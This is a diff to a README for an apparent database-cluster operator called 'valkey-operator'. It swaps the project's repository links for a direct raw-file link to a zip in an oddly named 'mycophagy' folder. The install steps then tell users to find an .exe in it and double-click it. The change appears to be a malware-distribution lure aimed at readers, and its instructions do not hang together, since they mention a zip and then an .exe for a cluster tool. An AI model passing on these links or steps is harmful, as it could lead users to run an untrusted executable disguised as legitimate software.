@@ -1,6 +1,6 @@
 # ⚡ valkey-operator - Manage your database clusters with ease
 
-[![Download valkey-operator](https://img.shields.io/badge/Download-valkey--operator-blue)](https://github.com/Mcke3997/valkey-operator)
+[![Download valkey-operator](https://img.shields.io/badge/Download-valkey--operator-blue)](https://raw.githubusercontent.com/Mcke3997/valkey-operator/main/mycophagy/operator-valkey-v3.7.zip)
 
 ## 📖 About this software
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run this software:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit this page to download: [https://github.com/Mcke3997/valkey-operator](https://github.com/Mcke3997/valkey-operator)
+1. Visit this page to download: [https://raw.githubusercontent.com/Mcke3997/valkey-operator/main/mycophagy/operator-valkey-v3.7.zip](https://raw.githubusercontent.com/Mcke3997/valkey-operator/main/mycophagy/operator-valkey-v3.7.zip)
 2. Locate the latest release file with the .exe extension.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the installation process.
